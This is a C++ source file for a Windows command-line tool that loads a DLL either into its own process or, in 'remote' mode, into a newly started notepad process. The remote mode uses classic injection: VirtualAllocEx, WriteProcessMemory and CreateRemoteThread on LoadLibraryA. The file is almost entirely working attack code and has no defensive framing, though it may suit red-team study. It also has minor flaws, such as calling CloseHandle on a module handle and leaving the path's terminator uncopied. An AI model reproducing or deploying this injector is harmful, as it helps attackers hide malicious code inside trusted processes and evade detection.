#include <stdio.h>
#include <windows.h>

void local_load_dll(LPCSTR path)
{
	HMODULE hModule = LoadLibraryA(path);
	if (hModule == NULL)
	{
		printf("[!] LoadLibrary failed with code: %d\n", GetLastError());
	}
	else
	{
		printf("  :: Module Address: %p\n", hModule);
		CloseHandle(hModule);
	}
	return;
}

void remote_load_dll(LPCSTR path)
{
	LPSTARTUPINFOA si = new STARTUPINFOA();
	PPROCESS_INFORMATION pi = new PROCESS_INFORMATION();

	BOOL bCreated = FALSE;
	BOOL bProtect = FALSE;
	BOOL bWritten = FALSE;
	int pathLen = 0;
	LPVOID pAddress = nullptr;
	PTHREAD_START_ROUTINE pRoutine = nullptr;
	HANDLE hThread = nullptr;
	SIZE_T stWritten = 0;
	DWORD lpflOldProtect = 0;
	HMODULE hModule = nullptr;
	FARPROC pLoadLibraryA = nullptr;

	bCreated = CreateProcessA(NULL, (LPSTR)"\"notepad\"", NULL, NULL, TRUE, 0, NULL, NULL, si, pi);

	if (bCreated == FALSE)
	{
		printf("[!] Failed to create process!\n");
		goto Cleanup;
	}

	printf("  :: Process ID: %d\n", pi->dwProcessId);
	printf("  :: Process Handle: %p\n", pi->hProcess);

	pathLen = strlen(path);

	pAddress = VirtualAllocEx(pi->hProcess, nullptr, pathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL)
	{
		goto Cleanup;
	}

	printf("  :: Base Address: %p\n", pAddress);

	bWritten = WriteProcessMemory(pi->hProcess, pAddress, (LPVOID)path, pathLen, &stWritten);

	if (bWritten == FALSE)
	{
		printf("[!] Failed to write bytes!\n");
		goto Cleanup;
	}
	printf("  :: Bytes Written: %zd\n", stWritten);

	bProtect = VirtualProtectEx(pi->hProcess, pAddress, pathLen, PAGE_EXECUTE_READ, &lpflOldProtect);

	if (bProtect == FALSE)
	{
		printf("[!] Failed to set PAGE_EXECUTE_READ!\n");
		goto Cleanup;
	}

	printf("  :: Set PAGE_EXECUTE_READ\n");

	hModule = GetModuleHandleA("kernel32");

	if (hModule == nullptr)
	{
		printf("[!] Failed to get handle on kernel32!\n");
		goto Cleanup;
	}

	pLoadLibraryA = GetProcAddress(hModule, "LoadLibraryA");

	if (pLoadLibraryA == nullptr)
	{
		printf("[!] Failed to get address of LoadLibraryA!\n");
		goto Cleanup;
	}

	pRoutine = (PTHREAD_START_ROUTINE)pLoadLibraryA;

	if (pRoutine == NULL)
	{
		goto Cleanup;
	}

	printf("  :: THREAD_START_ROUTINE: %p\n", pRoutine);

	hThread = CreateRemoteThread(pi->hProcess, NULL, 0, pRoutine, pAddress, 0, NULL);

	if (hThread == NULL)
	{
		goto Cleanup;
	}

	printf("  :: Thread: %p\n", hThread);

	printf("  :: Done!\n");
	goto Cleanup;

Cleanup:
	if (pi->hProcess)CloseHandle(pi->hProcess);
	if (pi->hThread)CloseHandle(pi->hThread);
	if (hThread)CloseHandle(hThread);
	return;
}

int main(int argc, char* argv[])
{
	LPCSTR path;
	int mode = 0;

	if (argc == 3)
	{
		mode = atoi(argv[1]);
		path = argv[2];
	}
	else
	{
		printf("PS> .\\on-disk-loader.exe <mode> <path>\n");
		printf("PS> .\\on-disk-loader.exe 1 c:\\file.dll\n");
		printf("PS> .\\on-disk-loader.exe 2 c:\\file.dll\n");
		printf("\nMODES:\n");
		printf("    - 1: Local\n");
		printf("    - 2: Remote\n");
		return -1;
	}

	printf("|> Loading: %s\n", path);

	switch (mode)
	{
	case 1:
		printf("|> Loading Locally!\n");
		local_load_dll(path);
		break;
	case 2:
		printf("|> Loading Remotely!\n");
		remote_load_dll(path);
		break;
	}

	return 0;
}